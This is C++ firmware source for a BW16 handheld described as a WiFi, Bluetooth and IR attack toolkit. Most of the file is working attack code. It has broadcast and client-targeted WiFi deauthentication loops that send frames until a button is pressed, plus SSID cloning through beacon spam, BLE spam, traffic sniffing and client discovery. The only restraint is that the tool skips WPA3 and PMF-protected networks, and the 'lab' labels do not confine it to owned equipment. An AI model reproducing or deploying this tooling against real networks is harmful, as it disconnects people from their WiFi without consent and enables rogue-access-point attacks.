// ─────────────────────────────────────────────────────────────
//  RAONE  –  BW16 RTL8720DN  Firmware v5.0
//  WiFi / Bluetooth / IR attack & analysis toolkit
//  2-button UI: BTN_OK (TTP223 touch) + BTN_NAV (tactile push)
//  Long-hold OK (>800 ms) = EMERGENCY BACK (universal, any state)
//
//  NOTE: Serial debug is DISABLED — PA7/PA8 used for
//        buzzer and IR blaster.  OLED is the only output.
// ─────────────────────────────────────────────────────────────

#include "Config.h"
#include "DisplayUi.h"
#include "HardwareManager.h"
#include "IrBlaster.h"
#include "LabStats.h"
#include "LabTestEngine.h"
#include "TargetManager.h"
#include "WifiScanner.h"
#include "packet-injection.h"
#include "PromiscuousSniffer.h"
#include "BluetoothScanner.h"
#include "BeaconSpam.h"
#include "BleSpam.h"
#include "ClientScanner.h"
#include "Theme.h"

// ─────────────────────────────────────────────────────────────
//  UI State machine
// ─────────────────────────────────────────────────────────────
enum UiState {
  UI_MAIN_MENU,
  UI_PLACEHOLDER,
  UI_BAND_MENU,
  UI_NETWORK_LIST,
  UI_NETWORK_DETAILS,
  UI_TARGET_DETAILS,
  UI_ANALYZER,
  UI_SYSTEM_INFO,
  UI_LAB_PRECHECK,
  UI_TARGET_MONITOR,
  UI_LAB_STATS,
  UI_PRINCIPAL_TEST,
  UI_BLE_MENU,
  UI_BLE_LIST,
  UI_BLE_DETAILS,
  UI_BLE_ANALYZER,
  UI_WIFI_ANAL_24,
  UI_WIFI_ANAL_5,
  UI_RADAR_BAND_MENU,
  UI_RADAR_NETWORK_LIST,
  UI_WIFI_RADAR,
  UI_BEACON_SPAM,
  UI_BLE_SPAM,
  UI_SNIFFER,
  UI_IR_MENU,
  UI_ACTION_MENU,
  UI_CLIENT_LIST,
  UI_CLIENT_SCANNING
};

// ─────────────────────────────────────────────────────────────
//  Menu item arrays  (all English)
// ─────────────────────────────────────────────────────────────

static const char *const MAIN_MENU_ITEMS[] = {
  "Scan Networks",
  "Target / Deauth",
  "Beacon Spam",
  "Sniffer",
  "BLE Tools",
  "IR Remote",
  "System Info"
};

static const char *const BLE_MENU_ITEMS[] = {
  "Scan Devices",
  "Analyzer",
  "BLE Spam",
  "Back"
};

static const uint8_t MAIN_MENU_COUNT = sizeof(MAIN_MENU_ITEMS) / sizeof(MAIN_MENU_ITEMS[0]);
static const uint8_t BLE_MENU_COUNT  = sizeof(BLE_MENU_ITEMS)  / sizeof(BLE_MENU_ITEMS[0]);

// Lab constants
static const uint16_t LAB_DEAUTH_REASON     = 0x06;
static const uint8_t  LAB_DEAUTH_CYCLE_LIMIT = 10;
static const uint16_t LAB_DEAUTH_TX_GAP_MS  = 100;
static const uint16_t RADAR_REFRESH_MS      = 2500;

// ─────────────────────────────────────────────────────────────
//  Global state
// ─────────────────────────────────────────────────────────────

UiState uiState       = UI_MAIN_MENU;
uint8_t mainMenuIndex = 0;
uint8_t bleMenuIndex  = 0;
uint8_t irMenuIndex   = 0;

int     selectedNetwork = 0;
int     listTop         = 0;
uint8_t selectedBand    = 5;
uint8_t analyzerBand    = 5;

uint32_t lastRadarScanAt  = 0;
NetworkInfo radarNetwork;
char radarBssid[18]       = {0};
bool radarNetworkFound    = false;
bool radarScanActive      = false;
bool labInjectionStoppedByUser = false;

int     selectedBleDevice = -1;
int     bleListTop        = 0;

// Action menu & client scanning state
uint8_t actionMenuIndex   = 0;
int     actionNetworkIdx  = -1;  // index of the network shown in action menu
uint8_t clientListSel     = 0;
uint8_t clientListTop     = 0;

static const uint8_t ACTION_MENU_COUNT = 6;

// ─────────────────────────────────────────────────────────────
//  Button helpers
// ─────────────────────────────────────────────────────────────

// OK = TTP223 touch sensor on PB20 (active HIGH)
// NAV = Tactile push button on PB3 (active LOW)

static bool anyButtonPressed() {
  return okPressed() || navPressed();
}

// ─────────────────────────────────────────────────────────────
//  Forward declarations
// ─────────────────────────────────────────────────────────────

void handleNav();
void handleOk();
void handleBack();
void emergencyBack();

void drawMainMenu();
void drawBleMenu();
void openMainMenuItem();
void openBleMenuItem();
void runDeauthLab();
void runDeauthLabTargeted(const uint8_t *dstMac);
bool runPacketInjectionLab();
bool runPacketInjectionLabTargeted(const uint8_t *dstMac);
bool stopPacketInjectionLab(bool anySent, uint32_t sentCount);
void returnToDeauthCaller(UiState returnState);
bool labStopRequested();
void waitForLabButtonsReleased();
bool isInjectionBlockedSecurity(uint32_t security);
bool parseMacAddress(const char *text, uint8_t mac[6]);
int  hexValue(char value);
void runTargetRefresh();
bool sameTarget(uint8_t networkIndex);
void showPlaceholder(const char *title, const char *message);
void runScan();
uint8_t nextIndex(uint8_t current, uint8_t count);
uint8_t previousIndex(uint8_t current, uint8_t count);
uint8_t nextBandOption(uint8_t current);
void moveSelectionAll(int delta);
void selectFirstNetworkInBand();
void normalizeListTop();
void moveBleSelection(int delta);
void closeBleAnalyzer();
void closeBleScanList();
void exitBeaconSpam();
void exitBleSpam();
void exitWifiAnalyzer();
void exitSniffer();
void startSniffer(uint8_t band);

void setup() {
  Serial.begin(115200);
  delay(100);
  Serial.println("\n[SYSTEM] Booting RAONE V6.0 ULTIMATE...");

  hwBegin();
  irBegin();
  uiBegin();

  // ─── Fast Boot Animation & Accurate Melody ─────────────────────
  uiDrawSplashProgress(20);
  ledRedOn();
  delay(100);
  uiDrawSplashProgress(50);
  ledGreenOn();
  delay(100);
  uiDrawSplashProgress(80);
  ledYellowOn();
  delay(100);
  uiDrawSplashProgress(100);
  ledAllOff();

  wifiScannerBegin();
  sniffBegin();
  bleBegin();
  beaconSpamBegin();
  bleSpamBegin();

  // Play full accurate Harry Potter melody while scanning on boot
  uiDrawStatus("Scanning WiFi...");
  ledYellowOn();
  wifiScannerStartScan();

  buzzerBootMelody();

  bool scanFinished = false;
  while (!wifiScannerPollScan(&scanFinished)) {
    delay(50);
  }

  ledYellowOff();
  ledFlashGreen(3, 100);
  buzzerScanDone();
  setLedMode(LED_MODE_IDLE);

  drawMainMenu();
}

// ─────────────────────────────────────────────────────────────
//  loop()
// ─────────────────────────────────────────────────────────────

void loop() {
  // ── Button reading ──────────────────────────────────────────
  // OK  = TTP223 touch sensor (PB20, active HIGH)
  //   Short tap  → handleOk()
  //   Long hold  → UNIVERSAL emergency back (handleBack from ANY state)
  // NAV = Tactile push button (PB3, active LOW)
  //   Short tap  → handleNav()

  if (okPressed()) {
    delay(30); // debounce
    if (okPressed()) {
      buzzerClick();
      uint32_t pressStart = millis();
      bool longPress = false;
      while (okPressed()) {
        if (millis() - pressStart > BTN_LONG_PRESS_MS) {
          longPress = true;
          buzzerClick(); // extra feedback for long press
          while (okPressed()) delay(10); // wait release
          emergencyBack(); // universal emergency terminator
          goto after_buttons;
        }
        delay(10);
      }
      if (!longPress) {
        handleOk();
      }
    }
  }

  if (navPressed()) {
    delay(30); // debounce
    if (navPressed()) {
      buzzerClick();
      while (navPressed()) delay(10); // wait release
      handleNav();
    }
  }

after_buttons:

  ledTaskUpdate();

  // ── Background tasks ─────────────────────────────────────────

  if (uiState == UI_MAIN_MENU || uiState == UI_PLACEHOLDER ||
      uiState == UI_PLACEHOLDER  || uiState == UI_BAND_MENU ||
      uiState == UI_RADAR_BAND_MENU || uiState == UI_BLE_MENU) {
    uiTickMenuAnimation();
  }

  if (bleActive()) {
    bleAnalyzerTick();
  }

  if (uiState == UI_SNIFFER) {
    sniffTick();
    static uint32_t lastSniffRefresh = 0;
    if (millis() - lastSniffRefresh > 250) {
      lastSniffRefresh = millis();
      uiRefreshSniffer(sniffGetStats());
    }
    ledTaskUpdate();
  }

  if (uiState == UI_BLE_LIST) {
    static uint32_t lastBleRefresh = 0;
    if (millis() - lastBleRefresh > 500) {
      lastBleRefresh = millis();
      uiRefreshBleList(selectedBleDevice, bleListTop);
    }
  }

  if (uiState == UI_BLE_ANALYZER) {
    static uint32_t lastAnalRefresh = 0;
    if (millis() - lastAnalRefresh > 100) {
      lastAnalRefresh = millis();
      uiRefreshBleAnalyzer();
    }
    ledTaskUpdate();
  }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    sniffTick();
    wifiAnalyzerTick();
    static uint32_t lastWifiAnalRefresh = 0;
    if (millis() - lastWifiAnalRefresh > 100) {
      lastWifiAnalRefresh = millis();
      uiRefreshWifiAnalyzer();
    }
    ledTaskUpdate();
  }

  if (radarScanActive) {
    bool scanOk = false;
    if (wifiScannerPollScan(&scanOk)) {
      radarScanActive = false;
      lastRadarScanAt = millis();
      if (uiState == UI_WIFI_RADAR) {
        int foundIndex = scanOk ? wifiScannerFindBssid(radarBssid) : -1;
        radarNetworkFound = foundIndex >= 0;
        if (radarNetworkFound) {
          radarNetwork  = wifiScannerNetwork(foundIndex);
          selectedNetwork = foundIndex;
        }
        uiDrawWifiRadar(&radarNetwork, radarNetworkFound);
      }
    }
  }

  if (uiState == UI_WIFI_RADAR) {
    uiTickWifiRadar();
    if (!radarScanActive && millis() - lastRadarScanAt >= RADAR_REFRESH_MS) {
      radarScanActive = wifiScannerStartScan();
      if (!radarScanActive) lastRadarScanAt = millis();
    }
    ledTaskUpdate();
  }

  if (uiState == UI_BEACON_SPAM) {
    beaconSpamTick();
    static uint32_t lastBeaconRefresh = 0;
    if (millis() - lastBeaconRefresh > 250) {
      lastBeaconRefresh = millis();
      uiRefreshBeaconSpam();
    }
    ledTaskUpdate();
  }

  if (uiState == UI_BLE_SPAM) {
    bleSpamTick();
    static uint32_t lastBleSpamRefresh = 0;
    if (millis() - lastBleSpamRefresh > 250) {
      lastBleSpamRefresh = millis();
      uiRefreshBleSpam();
    }
    ledTaskUpdate();
  }

  delay(60);
}

// ─────────────────────────────────────────────────────────────
//  Menu draw helpers
// ─────────────────────────────────────────────────────────────

void drawMainMenu() {
  uiState = UI_MAIN_MENU;
  uiDrawMenu("RAONE", MAIN_MENU_ITEMS, MAIN_MENU_COUNT, mainMenuIndex,
             "NAV=next  OK=select");
}

void drawBleMenu() {
  uiState = UI_BLE_MENU;
  uiDrawMenu("BLUETOOTH", BLE_MENU_ITEMS, BLE_MENU_COUNT, bleMenuIndex,
             "NAV=next  OK=select");
}

// ─────────────────────────────────────────────────────────────
//  NAV handler – cycles selection forward in current context
// ─────────────────────────────────────────────────────────────

void handleNav() {
  if (uiState == UI_MAIN_MENU) {
    mainMenuIndex = nextIndex(mainMenuIndex, MAIN_MENU_COUNT);
    drawMainMenu();
    delay(150);
    return;
  }

  if (uiState == UI_BLE_MENU) {
    bleMenuIndex = nextIndex(bleMenuIndex, BLE_MENU_COUNT);
    drawBleMenu();
    delay(150);
    return;
  }

  if (uiState == UI_IR_MENU) {
    irMenuIndex = nextIndex(irMenuIndex, irCodeCount());
    uiRefreshIrMenu(irMenuIndex);
    delay(150);
    return;
  }

  if (uiState == UI_BAND_MENU) {
    selectedBand = nextBandOption(selectedBand);
    uiDrawBandMenu(selectedBand);
    delay(150);
    return;
  }

  if (uiState == UI_RADAR_BAND_MENU) {
    selectedBand = nextBandOption(selectedBand);
    uiDrawRadarBandMenu(selectedBand);
    delay(150);
    return;
  }

  if (uiState == UI_NETWORK_LIST || uiState == UI_RADAR_NETWORK_LIST) {
    moveSelectionAll(1);
    return;
  }

  if (uiState == UI_BLE_LIST) {
    moveBleSelection(1);
    return;
  }

  if (uiState == UI_BLE_ANALYZER) {
    bleAnalyzerReset();
    uiDrawBleAnalyzer();
    delay(200);
    return;
  }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    sniffResetStats();
    wifiAnalyzerReset();
    uiDrawWifiAnalyzer();
    delay(200);
    return;
  }

  if (uiState == UI_ANALYZER) {
    analyzerBand = (analyzerBand == 5) ? 2 : 5;
    uiDrawAnalyzer(analyzerBand);
    delay(200);
    return;
  }

  if (uiState == UI_ACTION_MENU) {
    actionMenuIndex = (actionMenuIndex + 1) % ACTION_MENU_COUNT;
    uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
    delay(150);
    return;
  }

  if (uiState == UI_CLIENT_LIST) {
    uint8_t count = clientScanCount() + 1; // +1 for Back item
    clientListSel = (clientListSel + 1) % count;
    if (clientListSel >= clientListTop + UI_MENU_VISIBLE) {
      clientListTop = clientListSel - (UI_MENU_VISIBLE - 1);
    } else if (clientListSel < clientListTop) {
      clientListTop = clientListSel;
    }
    const char *macStrs[MAX_CLIENTS];
    for (uint8_t i = 0; i < clientScanCount(); i++) macStrs[i] = clientScanGet(i).macStr;
    uiDrawClientList(macStrs, clientListSel, clientListTop, clientScanCount());
    delay(150);
    return;
  }
}

// ─────────────────────────────────────────────────────────────
//  OK handler – select / confirm
// ─────────────────────────────────────────────────────────────

void handleOk() {
  if (uiState == UI_MAIN_MENU) { openMainMenuItem(); return; }
  if (uiState == UI_BLE_MENU)  { openBleMenuItem();  return; }

  if (uiState == UI_IR_MENU) {
    uiDrawStatus("Transmitting...");
    irTransmit(irMenuIndex);
    ledFlashGreen(1, 80);
    buzzerClick();
    uiRefreshIrMenu(irMenuIndex);
    delay(300);
    return;
  }

  if (uiState == UI_NETWORK_DETAILS) {
    actionNetworkIdx = selectedNetwork;
    actionMenuIndex = 0;
    uiState = UI_ACTION_MENU;
    uiDrawActionMenu(wifiScannerNetwork(selectedNetwork), actionMenuIndex);
    delay(200);
    return;
  }

  if (uiState == UI_TARGET_DETAILS) { runDeauthLab(); return; }

  if (uiState == UI_ANALYZER) {
    drawMainMenu();
    delay(200);
    return;
  }

  if (uiState == UI_WIFI_RADAR) {
    int radarIndex = wifiScannerFindBssid(radarBssid);
    if (radarIndex >= 0) {
      selectedNetwork = radarIndex;
    } else {
      selectFirstNetworkInBand();
    }
    listTop = 0;
    uiState = UI_RADAR_NETWORK_LIST;
    uiDrawNetworkListAll(selectedNetwork, listTop);
    delay(200);
    return;
  }

  if (uiState == UI_TARGET_MONITOR) { runTargetRefresh(); return; }

  if (uiState == UI_LAB_PRECHECK || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) {
    drawMainMenu();
    delay(200);
    return;
  }

  if (uiState == UI_SYSTEM_INFO) { drawMainMenu(); delay(200); return; }

  if (uiState == UI_BLE_DETAILS) {
    uiState = UI_BLE_LIST;
    uiDrawBleList(selectedBleDevice, bleListTop);
    delay(200);
    return;
  }

  if (uiState == UI_BLE_ANALYZER) { closeBleAnalyzer(); delay(200); return; }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    exitWifiAnalyzer();
    delay(200);
    return;
  }

  if (uiState == UI_BLE_LIST) {
    if (selectedBleDevice < 0) {
      closeBleScanList();
      delay(200);
      return;
    }
    if (selectedBleDevice < (int)bleCount()) {
      BleDeviceInfo device;
      if (!bleCopyDevice(selectedBleDevice, device)) return;
      uiState = UI_BLE_DETAILS;
      uiDrawBleDetails(device);
      delay(200);
    }
    return;
  }

  if (uiState == UI_BAND_MENU) {
    if (beaconSpamStart(selectedBand)) {
      uiState = UI_BEACON_SPAM;
      uiDrawBeaconSpam();
    } else {
      showPlaceholder("Beacon Spam", "Failed to start");
    }
    delay(200);
    return;
  }

  if (uiState == UI_NETWORK_LIST) {
    if (selectedNetwork >= (int)wifiScannerCount() || selectedNetwork < 0) {
      drawMainMenu();
      delay(200);
      return;
    }
    actionNetworkIdx = selectedNetwork;
    actionMenuIndex = 0;
    uiState = UI_ACTION_MENU;
    uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
    delay(200);
    return;
  }

  if (uiState == UI_ACTION_MENU) {
    if (actionMenuIndex == 0) {
      // Deauth (All)
      targetSet(wifiScannerNetwork(actionNetworkIdx));
      labStatsReset(targetGet().bssid);
      runDeauthLab(); 
    }
    else if (actionMenuIndex == 1) {
      // Scan Clients
      uint8_t targetMacBytes[6];
      parseMacAddress(wifiScannerNetwork(actionNetworkIdx).bssid, targetMacBytes);
      uiState = UI_CLIENT_SCANNING;
      clientScanStart(wifiScannerNetwork(actionNetworkIdx).channel, targetMacBytes);
      uiDrawGenericMessage("Scanning Clients...", "Sniffing data frames", "Wait 6s...");
    }
    else if (actionMenuIndex == 2) {
      // Clone & Beacon
      beaconSpamSetCloneSSID(wifiScannerNetwork(actionNetworkIdx).ssid);
      uint8_t band = wifiScannerIs5GHz(wifiScannerNetwork(actionNetworkIdx).channel) ? 5 : 2;
      if (beaconSpamStart(band)) {
        uiState = UI_BEACON_SPAM;
        uiDrawBeaconSpam();
      } else {
        showPlaceholder("Beacon Spam", "Failed to start");
      }
    }
    else if (actionMenuIndex == 3) {
      // Sniff Traffic
      startSniffer(wifiScannerNetwork(actionNetworkIdx).channel);
    }
    else if (actionMenuIndex == 4) {
      // Set as Target
      targetSet(wifiScannerNetwork(actionNetworkIdx));
      labStatsReset(targetGet().bssid);
      uiDrawGenericMessage("Target Saved", targetGet().ssid, "Ready for Deauth");
      delay(1200);
      uiState = UI_NETWORK_LIST;
      uiDrawNetworkListAll(selectedNetwork, listTop);
    }
    else if (actionMenuIndex == 5) {
      // Back
      uiState = UI_NETWORK_LIST;
      uiDrawNetworkListAll(selectedNetwork, listTop);
    }
    delay(200);
    return;
  }

  if (uiState == UI_CLIENT_LIST) {
    if (clientListSel < clientScanCount()) {
      targetSet(wifiScannerNetwork(actionNetworkIdx));
      labStatsReset(targetGet().bssid);
      runDeauthLabTargeted(clientScanGet(clientListSel).mac);
    } else {
      uiState = UI_ACTION_MENU;
      uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
    }
    delay(200);
    return;
  }

  if (uiState == UI_BEACON_SPAM) { exitBeaconSpam(); delay(200); return; }
  if (uiState == UI_BLE_SPAM)    { exitBleSpam();    delay(200); return; }
  if (uiState == UI_SNIFFER)     { exitSniffer();    delay(200); return; }
}

// ─────────────────────────────────────────────────────────────
//  Long-press OK = go back one level
// ─────────────────────────────────────────────────────────────

void handleBack() {
  if (uiState == UI_BLE_MENU)         { drawMainMenu(); return; }
  if (uiState == UI_IR_MENU)          { drawMainMenu(); return; }
  if (uiState == UI_PLACEHOLDER)      { drawMainMenu(); return; }
  if (uiState == UI_CLIENT_LIST)      { uiState = UI_ACTION_MENU; uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex); return; }
  if (uiState == UI_ACTION_MENU)      { uiState = UI_NETWORK_LIST; uiDrawNetworkListAll(selectedNetwork, listTop); return; }
  if (uiState == UI_NETWORK_DETAILS)  { uiState = UI_NETWORK_LIST; uiDrawNetworkListAll(selectedNetwork, listTop); return; }
  if (uiState == UI_TARGET_DETAILS)   { drawMainMenu(); return; }
  if (uiState == UI_ANALYZER)         { drawMainMenu(); return; }
  if (uiState == UI_WIFI_RADAR)       { drawMainMenu(); return; }
  if (uiState == UI_RADAR_BAND_MENU)  { drawMainMenu(); return; }
  if (uiState == UI_RADAR_NETWORK_LIST) { drawMainMenu(); return; }
  if (uiState == UI_LAB_PRECHECK || uiState == UI_TARGET_MONITOR || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) { drawMainMenu(); return; }
  if (uiState == UI_SYSTEM_INFO)      { drawMainMenu(); return; }
  if (uiState == UI_BLE_DETAILS)      { uiState = UI_BLE_LIST; uiDrawBleList(selectedBleDevice, bleListTop); return; }
  if (uiState == UI_BLE_LIST)         { closeBleScanList(); return; }
  if (uiState == UI_BLE_ANALYZER)     { closeBleAnalyzer(); return; }
  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) { exitWifiAnalyzer(); return; }
  if (uiState == UI_BEACON_SPAM)      { exitBeaconSpam(); return; }
  if (uiState == UI_BLE_SPAM)         { exitBleSpam(); return; }
  if (uiState == UI_SNIFFER)          { exitSniffer(); return; }
  if (uiState == UI_BAND_MENU || uiState == UI_NETWORK_LIST) { drawMainMenu(); return; }
  // Default: back to main
  drawMainMenu();
}

// ─────────────────────────────────────────────────────────────
//  Emergency back — universal terminator from ANY state
//  Touch sensor long-hold triggers this.
//  Stops any running attack, scan, or tool and goes to main menu.
// ─────────────────────────────────────────────────────────────

void emergencyBack() {
  // Stop any active attack/scan tools
  beaconSpamStop();
  bleSpamStop();
  sniffStop();
  clientScanStop();
  if (bleActive()) {
    bleStop();
    bleMarkStackStopped();
  }
  
  // Turn off status LEDs
  ledAllOff();
  setLedMode(LED_MODE_IDLE);
  
  // Double beep to confirm emergency stop
  buzzerBeep(1000, 80);
  delay(60);
  buzzerBeep(1000, 80);
  
  // Always go back to main menu
  drawMainMenu();
}

// ─────────────────────────────────────────────────────────────
//  Menu actions
// ─────────────────────────────────────────────────────────────

void openMainMenuItem() {
  switch (mainMenuIndex) {
    case 0:
      // Scan Networks -> If already scanned, open list; if none, scan first
      if (wifiScannerCount() == 0) {
        runScan();
      } else {
        selectedNetwork = 0;
        listTop = 0;
        uiState = UI_NETWORK_LIST;
        uiDrawNetworkListAll(selectedNetwork, listTop);
      }
      break;
    case 1:
      // Target / Deauth -> If target selected, open its action menu; else open network list to select one
      if (targetHasSelection()) {
        int idx = wifiScannerFindBssid(targetGet().bssid);
        actionNetworkIdx = (idx >= 0) ? idx : 0;
        actionMenuIndex = 0;
        uiState = UI_ACTION_MENU;
        uiDrawActionMenu(targetGet(), actionMenuIndex);
      } else {
        selectedNetwork = 0;
        listTop = 0;
        uiState = UI_NETWORK_LIST;
        uiDrawNetworkListAll(selectedNetwork, listTop);
      }
      break;
    case 2:
      // Beacon Spam
      selectedBand = 2;
      uiState = UI_BAND_MENU;
      uiDrawBandMenu(selectedBand);
      break;
    case 3:
      // Sniffer
      startSniffer(2);
      break;
    case 4:
      // BLE Tools
      drawBleMenu();
      break;
    case 5:
      // IR Remote
      uiState = UI_IR_MENU;
      irMenuIndex = 0;
      uiDrawIrMenu(irMenuIndex);
      break;
    case 6: {
      // System Info
      uiState = UI_SYSTEM_INFO;
      uint8_t c24 = wifiScannerCountBand(2);
      uint8_t c5  = wifiScannerCountBand(5);
      uint8_t tot = wifiScannerCount();
      uiDrawSystemInfo(targetHasSelection(), tot, c24, c5);
      break;
    }
  }
}

void openBleMenuItem() {
  switch (bleMenuIndex) {
    case 0: // Scan devices
      bleResetList();
      if (bleStart()) {
        selectedBleDevice = -1;
        bleListTop = 0;
        uiState = UI_BLE_LIST;
        uiDrawBleList(selectedBleDevice, bleListTop);
      } else {
        showPlaceholder("BLE Scan", "Failed to start");
      }
      break;
    case 1: // Analyzer
      if (bleActive()) {
        bleAnalyzerReset();
        uiState = UI_BLE_ANALYZER;
        uiDrawBleAnalyzer();
      } else if (bleStart()) {
        bleAnalyzerReset();
        uiState = UI_BLE_ANALYZER;
        uiDrawBleAnalyzer();
      } else {
        showPlaceholder("BLE Analyzer", "Failed to start");
      }
      break;
    case 2: // BLE Spam
      if (bleSpamStart()) {
        uiState = UI_BLE_SPAM;
        uiDrawBleSpam();
      } else {
        showPlaceholder("BLE Spam", "Failed to start");
      }
      break;
    case 3: // Back
      drawMainMenu();
      break;
  }
}

// ─────────────────────────────────────────────────────────────
//  Deauth Lab
// ─────────────────────────────────────────────────────────────

void runDeauthLab() {
  if (!targetHasSelection()) return;

  const NetworkInfo &target = targetGet();
  UiState returnState = uiState;

  uiState = UI_LAB_PRECHECK;
  uiDrawLabPrecheck(true, &target);
  delay(600);

  ledYellowOn();
  uiDrawStatus("Setting up...");

  labInjectionStoppedByUser = false;
  bool anySent = runPacketInjectionLab();

  ledYellowOff();

  if (anySent) {
    ledFlashGreen(2, 100);
    buzzerSuccess();
  } else {
    ledFlashRed(2, 150);
    buzzerError();
  }

  // After attack: show lab stats
  if (labStatsActive()) {
    const LabStats &s = labStatsGet();
    labTestSimulateDeauth(target, s.found > 0, s, anySent);
    uiState = UI_PRINCIPAL_TEST;
    uiDrawPrincipalTest(labTestGetReport());
  } else {
    returnToDeauthCaller(returnState);
  }
}

// Forward declaration of runDeauthLabTargeted's inner function
bool runPacketInjectionLabTargeted(const uint8_t *dstMac);

void runDeauthLabTargeted(const uint8_t *dstMac) {
  if (!targetHasSelection()) return;

  const NetworkInfo &target = targetGet();
  UiState returnState = uiState;

  uiState = UI_LAB_PRECHECK;
  uiDrawLabPrecheck(true, &target);
  delay(600);

  ledYellowOn();
  uiDrawStatus("Setting up targeted...");

  labInjectionStoppedByUser = false;
  bool anySent = runPacketInjectionLabTargeted(dstMac);

  ledYellowOff();

  if (anySent) {
    ledFlashGreen(2, 100);
    buzzerSuccess();
  } else {
    ledFlashRed(2, 150);
    buzzerError();
  }

  if (labStatsActive()) {
    const LabStats &s = labStatsGet();
    labTestSimulateDeauth(target, s.found > 0, s, anySent);
    uiState = UI_PRINCIPAL_TEST;
    uiDrawPrincipalTest(labTestGetReport());
  } else {
    returnToDeauthCaller(returnState);
  }
}

bool runPacketInjectionLabTargeted(const uint8_t *dstMac) {
  const NetworkInfo &target = targetGet();

  uint8_t targetMac[6];
  if (!parseMacAddress(target.bssid, targetMac)) {
    uiDrawStatus("Bad MAC address");
    ledFlashRed(3, 100);
    buzzerError();
    delay(900);
    return false;
  }

  if (isInjectionBlockedSecurity(target.security)) {
    uiDrawStatus("WPA3 - Protected");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  // Ensure WiFi STA mode & dual-band channel plan
  wifi_on(RTW_MODE_STA);
  wifi_change_channel_plan(0x25);
  delay(50);

  if (wifi_set_channel(target.channel) != RTW_SUCCESS) {
    uiDrawStatus("Channel set failed");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  uiDrawTxCounter(0);

  bool anySent = false;
  uint32_t sentCount = 0;
  uint32_t lastUiUpdate = 0;
  int consecutiveFails = 0;

  uint8_t dstMacBuf[6];
  memcpy(dstMacBuf, dstMac, 6);

  while (true) {
    if (labStopRequested()) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    for (uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst++) {
      if (anyButtonPressed()) {
        return stopPacketInjectionLab(anySent, sentCount);
      }

      bool sent = wifi_tx_deauth_frame(targetMac, dstMacBuf, LAB_DEAUTH_REASON);
      if (sent) {
        anySent = true;
        sentCount++;
        consecutiveFails = 0;
        ledFlashGreen(1, 10);
      } else {
        consecutiveFails++;
        ledFlashRed(1, 10);
      }

      if (millis() - lastUiUpdate > 100) {
        lastUiUpdate = millis();
        uiDrawTxCounter(sentCount);
      }

      if (consecutiveFails >= 25) {
        uiDrawStatus("TX Retrying...");
        delay(100);
        wifi_set_channel(target.channel);
        consecutiveFails = 0;
      }

      delay(LAB_DEAUTH_TX_GAP_MS);
      yield();
    }
  }
}

bool runPacketInjectionLab() {
  const NetworkInfo &target = targetGet();

  uint8_t targetMac[6], broadcastMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  if (!parseMacAddress(target.bssid, targetMac)) {
    uiDrawStatus("Bad MAC address");
    ledFlashRed(3, 100);
    buzzerError();
    delay(900);
    return false;
  }

  if (isInjectionBlockedSecurity(target.security)) {
    uiDrawStatus("WPA3 - Protected");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  wifi_on(RTW_MODE_STA);
  wifi_change_channel_plan(0x25);
  delay(50);

  if (wifi_set_channel(target.channel) != RTW_SUCCESS) {
    uiDrawStatus("Channel set failed");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  uiDrawTxCounter(0);

  bool anySent = false;
  uint32_t sentCount = 0;
  uint32_t lastUiUpdate = 0;
  int consecutiveFails = 0;

  while (true) {
    if (labStopRequested()) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    for (uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst++) {
      if (anyButtonPressed()) {
        return stopPacketInjectionLab(anySent, sentCount);
      }

      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, LAB_DEAUTH_REASON);
      if (sent) {
        anySent = true;
        sentCount++;
        consecutiveFails = 0;
        ledFlashGreen(1, 10);
      } else {
        consecutiveFails++;
        ledFlashRed(1, 10);
      }

      if (millis() - lastUiUpdate > 100) {
        lastUiUpdate = millis();
        uiDrawTxCounter(sentCount);
      }

      if (consecutiveFails >= 25) {
        uiDrawStatus("TX Retrying...");
        delay(100);
        wifi_set_channel(target.channel);
        consecutiveFails = 0;
      }

      delay(LAB_DEAUTH_TX_GAP_MS);
      yield();
    }
  }
}

bool stopPacketInjectionLab(bool anySent, uint32_t sentCount) {
  labInjectionStoppedByUser = true;
  uiDrawStatus("Stopped");
  buzzerClick();
  delay(300);
  waitForLabButtonsReleased();
  return anySent;
}

void returnToDeauthCaller(UiState returnState) {
  if (returnState == UI_PLACEHOLDER) { drawMainMenu(); return; }
  if (returnState == UI_NETWORK_DETAILS) {
    uiState = UI_NETWORK_LIST;
    uiDrawNetworkListAll(selectedNetwork, listTop);
    return;
  }
  if (returnState == UI_ACTION_MENU) {
    uiState = UI_ACTION_MENU;
    uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
    return;
  }
  drawMainMenu();
}

bool labStopRequested() {
  return anyButtonPressed();
}

void waitForLabButtonsReleased() {
  while (anyButtonPressed()) delay(20);
}

bool isInjectionBlockedSecurity(uint32_t security) {
  return security == RTW_SECURITY_WPA3_AES_PSK ||
         security == RTW_SECURITY_WPA2_WPA3_MIXED ||
         security == RTW_SECURITY_WPA2_AES_CMAC;
}

bool parseMacAddress(const char *text, uint8_t mac[6]) {
  if (strlen(text) != 17) return false;
  for (uint8_t i = 0; i < 6; i++) {
    int high = hexValue(text[i * 3]);
    int low  = hexValue(text[i * 3 + 1]);
    if (high < 0 || low < 0) return false;
    mac[i] = (high << 4) | low;
    if (i < 5 && text[i * 3 + 2] != ':') return false;
  }
  return true;
}

